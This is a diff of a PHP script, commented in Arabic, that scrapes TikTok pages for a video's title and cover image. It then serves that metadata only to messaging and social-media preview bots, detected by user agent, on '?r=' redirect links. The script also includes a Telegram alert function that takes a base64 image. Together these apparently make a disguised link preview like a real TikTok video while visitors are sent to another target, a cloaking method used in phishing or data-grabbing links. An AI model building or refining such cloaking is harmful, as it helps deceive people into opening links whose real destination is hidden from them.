@@ -60,33 +60,68 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// دالة جلب تفاصيل تيك توك بدقة عبر TikWM API
+// دالة السحب المباشر الحقيقي من صفحات تيك توك (Web Scraping)
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
-        'title' => 'TikTok Video - شاهد الآن', 
-        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800'
+        'title' => 'TikTok Video', 
+        'image' => ''
     ];
 
-    $ch = curl_init("https://www.tikwm.com/api/?url=" . urlencode($url));
+    $ch = curl_init();
     curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, 
-        CURLOPT_TIMEOUT => 6, 
-        CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS => 5,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+        CURLOPT_HTTPHEADER => [
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language: en-US,en;q=0.5',
+            'Referer: https://www.tiktok.com/'
+        ]
     ]);
-    $res = curl_exec($ch);
+    $html = curl_exec($ch);
+    $effective_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
     curl_close($ch);
 
-    if ($res) {
-        $data = json_decode($res, true);
-        if (isset($data['code']) && $data['code'] === 0 && !empty($data['data'])) {
-            if (!empty($data['data']['title'])) $meta['title'] = $data['data']['title'];
-            if (!empty($data['data']['cover'])) {
-                $meta['image'] = $data['data']['cover'];
-                return $meta;
+    if ($html) {
+        // استخراج العنوان الحقيقي للفيديو
+        if (preg_match('/<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)["\']/i', $html, $matches)) {
+            $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
+        } elseif (preg_match('/<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:title["\']/i', $html, $matches)) {
+            $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
+        }
+
+        // استخراج صورة الغلاف الحقيقية للفيديو
+        if (preg_match('/<meta[^>]+property=["\']og:image["\'][^>]+content=["\']([^"\']+)["\']/i', $html, $matches)) {
+            $meta['image'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
+        } elseif (preg_match('/<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:image["\']/i', $html, $matches)) {
+            $meta['image'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
+        }
+    }
+
+    // إذا لم يتم العثور على الصورة مباشرة، نستخدم TikWM API كبديل احتياطي قوي
+    if (empty($meta['image'])) {
+        $ch2 = curl_init("https://www.tikwm.com/api/?url=" . urlencode($effective_url ?: $url));
+        curl_setopt_array($ch2, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 6,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        ]);
+        $res = curl_exec($ch2);
+        curl_close($ch2);
+        if ($res) {
+            $data = json_decode($res, true);
+            if (isset($data['code']) && $data['code'] === 0 && !empty($data['data'])) {
+                if (!empty($data['data']['title'])) $meta['title'] = $data['data']['title'];
+                if (!empty($data['data']['cover'])) $meta['image'] = $data['data']['cover'];
             }
         }
     }
+
     return $meta;
 }
 
@@ -147,23 +182,25 @@ if (isset($_GET['r'])) {
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|twitterbot|discordbot|preview/i', $ua);
 
-        // رد خاص ومحسّن لبوت واتساب وفيسبوك لإجبارهم على جلب الصورة والعنوان الحقيقيين
+        // إرسال البيانات الحقيقية لبوت واتساب وفيسبوك
         if ($is_bot) {
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta charset="UTF-8">';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta property="og:description" content="TikTok Video - اضغط للمشاهدة">';
-            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
-            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:description" content="شاهد هذا الفيديو على تيك توك">';
+            if (!empty($meta_image)) {
+                echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
+                echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
+            }
             echo '<meta property="og:image:type" content="image/jpeg">';
-            echo '<meta property="og:image:width" content="1200">';
-            echo '<meta property="og:image:height" content="630">';
             echo '<meta property="og:type" content="video.other">';
             echo '<meta property="og:url" content="' . htmlspecialchars($target_redirect) . '">';
             echo '<meta name="twitter:card" content="summary_large_image">';
             echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
+            if (!empty($meta_image)) {
+                echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
+            }
             echo '</head><body></body></html>';
             exit();
         }
